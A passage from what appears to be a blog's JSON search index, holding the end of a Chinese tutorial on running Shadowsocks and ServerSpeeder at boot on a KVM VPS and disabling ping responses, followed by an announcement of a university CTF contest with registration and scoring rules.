在/etc/init.d目录下新建ss_start文件并加入如下内容：\nnohup /usr/local/bin/ss-server -c /etc/shadowsocks.json \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\r  在/etc/init.d目录下新建rs_start文件并加入如下内容：\n/serverspeeder/bin/serverSpeeder.sh start\r  加权限 chmod +x /etc/init.d/ss_start\rchmod +x /etc/init.d/rs_start\r加自启 sudo update-rc.d ss_start defaults 91\rsudo update-rc.d rs_start defaults 91\r安全措施   关闭 ping 功能：\n根据我的经验，如果不关闭 ping，会经常有黑客试探攻击服务器，所以最好 关闭 ping 服务，只需要每次启动或者重启服务器后执行一行代码：\necho \u0026quot;1\u0026quot; \u0026gt;/proc/sys/net/ipv4/icmp_echo_ignore_all\r至此，搭建+优化SS全过程已完毕。\n  ","date":1477353600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1477353600,"objectID":"7c802f7629a6912c73a8d7b588d7cb8e","permalink":"https://p0st3r.github.io/post/kvm-vps-ss-rs/","publishdate":"2016-10-25T00:00:00Z","relpermalink":"/post/kvm-vps-ss-rs/","section":"post","summary":"整理了这个SS搭建及优化的教程，适用于所有KVM技术的VPS，希望对喜欢折腾的朋友能起到一定的参考作用。","tags":["VPN","Proxy"],"title":"基于KVM架构的VPS服务器搭建ss及锐速优化教程","type":"post"},{"authors":[],"categories":null,"content":"报名方式 登录网站 www.giantbranch.cn:8889\n点击Register\u0026ndash;\u0026gt;填写邮箱队伍名字及密码；最后点击Login输入队伍名字和密码登录网站；点击challenge进行比赛)\n比赛规则 本次比赛采取线上赛，只需要一台电脑便能完成比赛，选手通过平台进行做题，每道题目有相应的分值，解题多者且分值高将获得更高的排位，分数相同时将按flag提交的时间先后进行排名。\n详细规则请阅读\nhttp://www.giantbranch.cn:8889/%E8%A7%84%E5%88%99\n补充一下，校内的同学，认真写writeup（题解），排名靠前的可获得神秘奖品\n","date":1476057600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1476057600,"objectID":"be7de941441649eefafb04047a72edd8","permalink":"https://p0st3r.github.io/talk/xp0intctf2016/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/talk/xp0intctf2016/","section":"talk","summary":"第一届暨南大学珠海校区Xp0int新生杯挑战赛.","tags":[],"title":"Xp0intCTF2016","type":"talk"}]